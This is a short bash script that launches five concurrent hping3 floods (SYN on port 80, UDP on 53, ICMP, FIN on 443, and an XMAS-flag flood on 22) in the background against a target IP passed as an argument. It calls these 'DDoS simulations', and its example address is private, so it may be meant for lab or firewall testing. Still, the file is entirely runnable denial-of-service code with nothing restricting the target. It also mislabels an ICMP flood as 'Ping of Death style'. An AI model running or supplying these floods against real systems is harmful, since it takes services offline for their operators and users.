#!/bin/bash

# Usage: ./hping3-ddos.sh <TARGET_IP>
# Example: ./hping3-ddos.sh 192.168.139.129

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "Starting DDoS simulations against $TARGET..."
sleep 2

# 1. SYN Flood (Classic DoS attack on TCP)
echo "[*] SYN Flood on port 80..."
hping3 -S --flood -V -p 80 $TARGET &

# 2. UDP Flood (Bypassing TCP-based rules)
echo "[*] UDP Flood on port 53..."
hping3 --udp --flood -p 53 -V $TARGET &

# 3. ICMP Flood (Ping of Death style)
echo "[*] ICMP Flood..."
hping3 --icmp --flood -V $TARGET &

# 4. FIN scan flood
echo "[*] FIN Flag Flood on port 443..."
hping3 -F --flood -V -p 443 $TARGET &

# 5. XMAS scan flood (rare flags combo)
echo "[*] XMAS Flood on port 22..."
hping3 -F -P -U --flood -V -p 22 $TARGET &

echo "[!] All attacks launched in background. Use 'pkill hping3' to stop."
